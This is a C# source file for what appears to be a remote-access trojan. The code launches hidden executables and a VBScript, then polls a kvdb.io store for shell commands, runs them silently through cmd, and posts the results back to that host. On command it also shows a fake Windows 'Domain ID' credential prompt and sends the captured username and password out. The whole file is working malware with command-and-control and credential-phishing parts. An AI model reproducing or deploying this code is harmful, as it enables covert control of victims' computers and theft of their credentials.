using System.Text;
using System.Collections.Generic;
using System.Linq; 
using System.Net;
using System.Threading; 
using System.Diagnostics;
using System.Windows;
using System.Runtime.InteropServices;
using Microsoft.Win32.SafeHandles;
using System;
using System.Security.Cryptography;
using System.IO;

//The auther of this File is FK007
public class khan_command_exec
{
	
	public string khan_Sync(string command)
{
     try
     {
			Console.WriteLine("In sync function- string");
			System.Diagnostics.ProcessStartInfo pr =new System.Diagnostics.ProcessStartInfo("cmd", "/c " + command);
			pr.RedirectStandardOutput = true;
			pr.UseShellExecute = false;
			pr.CreateNoWindow = true;
			System.Diagnostics.Process p = new System.Diagnostics.Process();
			p.StartInfo = pr;
			p.Start();
			string result = p.StandardOutput.ReadToEnd();
			Console.WriteLine(result);
			return result;
      }
      catch (Exception ex)
      {
		Console.WriteLine("(1): " + ex.Message);
		return "0";
      }
}
	public void khan_Sync(object command)
{
     try
     {
			Console.WriteLine("In sync function - object");
			Console.WriteLine("About to execute command : " + command.ToString());
			System.Diagnostics.ProcessStartInfo pr =new System.Diagnostics.ProcessStartInfo("cmd", "/c " + command);
			pr.RedirectStandardOutput = true;
			pr.UseShellExecute = false;
			pr.CreateNoWindow = true;
			System.Diagnostics.Process p = new System.Diagnostics.Process();
			p.StartInfo = pr;
			p.Start();
			//string result = p.StandardOutput.ReadToEnd();
			//Console.WriteLine(result);
			
      }
      catch (Exception ex)
      {
		Console.WriteLine("(1): " + ex.Message);
		
      }
}
	public void khan_Async(string command)
	{
	   try
	   {
		Console.WriteLine("In Async function - object");
		Thread obj= new Thread(new ParameterizedThreadStart(khan_Sync));
		obj.IsBackground = true;
		obj.Priority = ThreadPriority.Highest;
		obj.Start(command);
	   }
	   catch (Exception ex)
	   {
		Console.WriteLine("(4): " +ex.Message);
	   }
	}
	
}
class Driver_Program
{
	public string PostRequestJson(string endpoint, string json)
	{
    		
			Console.WriteLine("(2) End point is : " +endpoint);
    		string jsonResponse = string.Empty;
 
    		using (var client = new WebClient())
    		{
       		 try
        		{
            		client.UseDefaultCredentials = true;
            		client.Headers.Add("Content-Type: application/x-www-form-urlencoded");
            		client.Headers.Add("Accept: */*");
					string credentials = Convert.ToBase64String(Encoding.ASCII.GetBytes("password" + ":" + "password"));
					client.Headers.Add("Authorization: "+string.Format("Basic {0}", credentials));
            		var uri = new Uri(endpoint);
           		    var response = client.UploadString(uri, "POST", json);
            		jsonResponse = response;
					Console.WriteLine("DATA written");
					WebHeaderCollection myWebHeaderCollection = client.ResponseHeaders;
       			 }
        	catch (WebException ex)
        		{
            		
            		if (ex.Status == WebExceptionStatus.ProtocolError)
            		{
						 string response = new StreamReader(ex.Response.GetResponseStream()).ReadToEnd();
						 Console.WriteLine("Error is :" +response);
						HttpWebResponse wrsp = (HttpWebResponse)ex.Response;
						var statusCode = (int)wrsp.StatusCode;
						var msg = wrsp.StatusDescription;
						Console.WriteLine("Exception : " + msg + wrsp.StatusCode);
						return msg;
               		
            		}
            		else
            		{
                		Console.WriteLine("Exception 11" + ex.Message);
						return ex.Message;
            		}
        		}
    		}
 
   		 return jsonResponse;
	}
		public string getData(string endpoint)
	{
		using (var client = new WebClient())
		{
   			 try
    			{
				Console.WriteLine("(1) End point is : " +endpoint);
        		client.BaseAddress = endpoint;
        		client.UseDefaultCredentials = true;
				string credentials = Convert.ToBase64String(Encoding.ASCII.GetBytes("password" + ":" + "password"));
        		var jsonResponse = client.DownloadString(endpoint);
				return jsonResponse;
    			}
   			 catch (WebException ex)
    			{
       			
            		if (ex.Status == WebExceptionStatus.ProtocolError)
            		{
               		 	HttpWebResponse wrsp = (HttpWebResponse)ex.Response;
                		var statusCode = (int)wrsp.StatusCode;
                		var msg = wrsp.StatusDescription;
						Console.WriteLine("Exception : " + msg);
						return "0";
               			
            		}
            		else
					{
                		Console.WriteLine("Exception 11" + ex.Message);
						return "0";
            		}
				}
			catch(Exception ex)
			{
				Console.WriteLine("Genera; Exception " + ex.Message);
				return "0";
			}
	}
	
 
	}
    static void Main(string[] args)
    {
		khan_command_exec objj=new khan_command_exec();
		string res="FQM3hbtRhm94tkaLXBm5kF"; 
		string res_key=res;
		string updated_ep="https://kvdb.io/"+res+"/master_files";
		Driver_Program obj=new Driver_Program();
		try
		{
			string a="D:\\flash.exe,D:\\IntelHD.exe,VB";
		if (a.Length > 0)
		{
			string command_args=a;
			string [] splitted=command_args.Split(',');
			foreach (string command in splitted)
			{
				Console.WriteLine("Command is : " +command);
				/*string strCmdText=command;
				//strCmdText= "/C copy /b Image1.jpg + Archive.rar Image2.jpg";
				if (command.Equals("VB"))
				{
					System.Diagnostics.Process.Start("cscript","so.vbs");
				}
				else
				{
				System.Diagnostics.Process.Start(command);
				}**/
				Process myProcess = new Process();
				try
				{
					if (command.Equals("VB"))
					{
						System.Diagnostics.Process.Start("cscript","so.vbs");
					}
					else
					{
						myProcess.StartInfo.UseShellExecute = false;
						myProcess.StartInfo.FileName = command;
						myProcess.StartInfo.CreateNoWindow = true;
						myProcess.Start();
					}
					
				}
				catch (Exception e)
				{
					Console.WriteLine("(0) Exception :" +e.Message);
				}
			}
			
		}
		}
		catch(Exception ex)
		{
			Console.WriteLine(ex.Message);
		}
		
		while(true)
				{
				try
				{
				int sleepfor = 5000;
				Thread.Sleep(sleepfor);
				string res1="FQM3hbtRhm94tkaLXBm5kF"; 
				string res_key1=res1;
				string updated_ep0="https://kvdb.io/"+res_key1+"/commands_store";
				var resp2=obj.getData(updated_ep0);
				string new_command="";
				if ((resp2.Equals("0") == false) && (resp2.Equals("") == false))
				{
					//encrypt,path,C:\Users\furqa\Documents,0
					string []command_details=resp2.Split(',');
					string command_type=command_details[0];
					string command=command_details[1];
					string type=command_details[2];
					if(command_type.Equals("1"))
					{
						Console.WriteLine("(a) Recievied New command: " +command_details[1]);
						
						 if (type.Equals("1") || type.Equals("0"))
						{
							
							
								new_command="0"+","+command_details[1]+","+command_details[2];
								var res2=obj.PostRequestJson(updated_ep0,new_command);
								Console.WriteLine("Updated Resp : " +res2);
								string result="";
								if(command.Equals("<cred_prompt>"))
								{
									Program.Start();
									Console.WriteLine("Diff class : " +Program.f_user);
									Console.WriteLine("Diff class : " +Program.f_pass);
									result="Username : " + Program.f_user + "\n Password :"+ Program.f_pass;
								}
								else
								{
								result=objj.khan_Sync(command);
								}
								string updated_epp="https://kvdb.io/"+res_key+"/command_results";
								string c_r=command_details[1]+"**###**"+result;
								var r=obj.PostRequestJson(updated_epp,c_r);
							
							
						}
						
						else 
						{
							Console.WriteLine("(b) Invalid type : " +type);
						}
					}
					else
					{
							Console.WriteLine("(1) No new command  "+command_type);
					}
				}
				else
				{
					Console.WriteLine("(**) No new command  "+resp2);
				}
				Console.WriteLine("Resp obtained : "+resp2);
				}
				catch(Exception ex)
				{
					Console.WriteLine("Exception : " +ex.Message);
					//sw.Write(ex.Message);
				}
				}
       
    }

}



 class Program
    {
        const int MAX_USER_NAME = 100;
        const int MAX_PASSWORD = 100;
        const int MAX_DOMAIN = 100;
        public static string f_user;
        public static string f_pass;
        public enum CredUIReturnCodes
        {
            NO_ERROR = 0,
            ERROR_CANCELLED = 1223,
            ERROR_NO_SUCH_LOGON_SESSION = 1312,
            ERROR_NOT_FOUND = 1168,
            ERROR_INVALID_ACCOUNT_NAME = 1315,
            ERROR_INSUFFICIENT_BUFFER = 122,
            ERROR_INVALID_PARAMETER = 87,
            ERROR_INVALID_FLAGS = 1004,
            ERROR_BAD_ARGUMENTS = 160
        }
       
        [Flags]
        public enum CREDUI_FLAGS
        {
            
            CREDUIWIN_GENERIC = 0x1,
            CREDUIWIN_CHECKBOX = 0x2,
            REQUEST_ADMINISTRATOR = 0x4,
            EXCLUDE_CERTIFICATES = 0x8,
            CREDUIWIN_AUTHPACKAGE_ONLY = 0x10,
            CREDUIWIN_IN_CRED_ONLY = 0x20,
            SHOW_SAVE_CHECK_BOX = 0x40,
            ALWAYS_SHOW_UI = 0x80,
            CREDUIWIN_ENUMERATE_ADMINS = 0x100,         
            CREDUIWIN_ENUMERATE_CURRENT_USER = 0x200,
            VALIDATE_USERNAME = 0x400,
            COMPLETE_USERNAME = 0x800,
            CREDUIWIN_SECURE_PROMPT = 0x1000,
            SERVER_CREDENTIAL = 0x4000,
            EXPECT_CONFIRMATION = 0x20000,
            GENERIC_CREDENTIALS = 0x40000,
            USERNAME_TARGET_CREDENTIALS = 0x80000,
            CREDUIWIN_PACK_32_WOW = 0x10000000,
        }


        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct CREDUI_INFO
        {
            public int cbSize;
            public IntPtr hwndParent;
            public string pszMessageText;
            public string pszCaptionText;
            public IntPtr hbmBanner;
        }


        [DllImport("credui", CharSet = CharSet.Unicode)]
        private static extern CredUIReturnCodes CredUIPromptForCredentialsW(ref CREDUI_INFO creditUR,
           string targetName,
           IntPtr reserved1,
           int iError,
           StringBuilder userName,
           int maxUserName,
           StringBuilder password,
           int maxPassword,
           [MarshalAs(UnmanagedType.Bool)] ref bool pfSave,
           CREDUI_FLAGS flags);

        public static CredUIReturnCodes PromptForCredentials(
          ref CREDUI_INFO creditUI,
          string targetName,
          int netError,
          ref string userName,
          ref string password,
          ref bool save,
          CREDUI_FLAGS flags)
        {

            StringBuilder user = new StringBuilder(MAX_USER_NAME);
            StringBuilder pwd = new StringBuilder(MAX_PASSWORD);
            creditUI.cbSize = Marshal.SizeOf(creditUI);

            CredUIReturnCodes result = CredUIPromptForCredentialsW(
                          ref creditUI,
                          targetName,
                          IntPtr.Zero,
                          netError,
                          user,
                          MAX_USER_NAME,
                          pwd,
                          MAX_PASSWORD,
                          ref save,
                          flags);

            userName = user.ToString();
            password = pwd.ToString();
            Console.WriteLine("User Entered :" + userName);
            Console.WriteLine("Pass Entered :" + password);
            f_user = user.ToString();
            f_pass = pwd.ToString();
            return result;
        }


        public static void Start()
        {
           
            string host = "Connecting to Domain";
            CREDUI_INFO info = new CREDUI_INFO();
            info.pszCaptionText = host;
            info.pszMessageText = "Please Enter Your Domain ID";

            CREDUI_FLAGS flags = CREDUI_FLAGS.GENERIC_CREDENTIALS |
                  CREDUI_FLAGS.SHOW_SAVE_CHECK_BOX |
                  CREDUI_FLAGS.ALWAYS_SHOW_UI |
                  CREDUI_FLAGS.EXPECT_CONFIRMATION;
            string username = "khan123";
            string password = "khan123";
            bool savePwd = false;
            CredUIReturnCodes result = PromptForCredentials(ref info, host, 0, ref username,
                          ref password, ref savePwd, flags);
            Console.WriteLine("Final result : ");
            Console.WriteLine(Program.f_user);
            Console.WriteLine(Program.f_pass);
             
        }
    }
